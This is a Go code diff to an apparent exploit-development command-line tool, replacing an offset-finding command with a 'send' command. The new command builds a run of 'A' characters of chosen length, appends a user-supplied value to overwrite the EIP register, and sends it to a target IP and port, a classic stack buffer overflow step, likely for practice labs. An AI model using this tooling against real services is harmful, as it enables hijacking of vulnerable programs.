@@ -19,15 +19,16 @@ import (
 	"fmt"
 	"strings"
 
-	"github.com/souvikhaldar/gorand"
+	"github.com/souvikhaldar/goffer/pkg/webfuzz"
 	"github.com/spf13/cobra"
 )
 
-// findCmd represents the find command
+var eip string
+var eipAddr int
 
-var subStr string
-var findCmd = &cobra.Command{
-	Use:   "find",
+// sendCmd represents the send command
+var sendCmd = &cobra.Command{
+	Use:   "send",
 	Short: "A brief description of your command",
 	Long: `A longer description that spans multiple lines and likely contains examples
 and usage of using your command. For example:
@@ -36,23 +37,29 @@ Cobra is a CLI library for Go that empowers applications.
 This application is a tool to generate the needed files
 to quickly create a Cobra application.`,
 	Run: func(cmd *cobra.Command, args []string) {
-		fmt.Println("find called")
-		randStr := gorand.RandStr(l)
-		addr := strings.Index(randStr, subStr)
+		fmt.Println("send called")
+		garbage := strings.Repeat("A", eipAddr)
+		fmt.Println("Len of garbage: ", len(garbage))
+		fmt.Println("Len of eip: ", len(eip))
+		fmt.Println("EIP: ", eip)
+		if err := webfuzz.FuzzContent(ip, port, command, garbage+eip, poolSize); err != nil {
+			fmt.Println("Unable to fuzz: ", err)
+		}
 	},
 }
 
 func init() {
-	offsetCmd.AddCommand(findCmd)
-	findCmd.LocalFlags().StringVarP(&subStr, "register", "r", "", "value of the register, Eg EIP")
+	rootCmd.AddCommand(sendCmd)
+	sendCmd.Flags().StringVarP(&eip, "eip", "e", "", "The value to overwrite EIP")
+	sendCmd.Flags().IntVarP(&eipAddr, "eip-address", "a", 0, "starting address of EIP")
 
 	// Here you will define your flags and configuration settings.
 
 	// Cobra supports Persistent Flags which will work for this command
 	// and all subcommands, e.g.:
-	// findCmd.PersistentFlags().String("foo", "", "A help for foo")
+	// sendCmd.PersistentFlags().String("foo", "", "A help for foo")
 
 	// Cobra supports local flags which will only run when this command
 	// is called directly, e.g.:
-	// findCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
+	// sendCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
 }
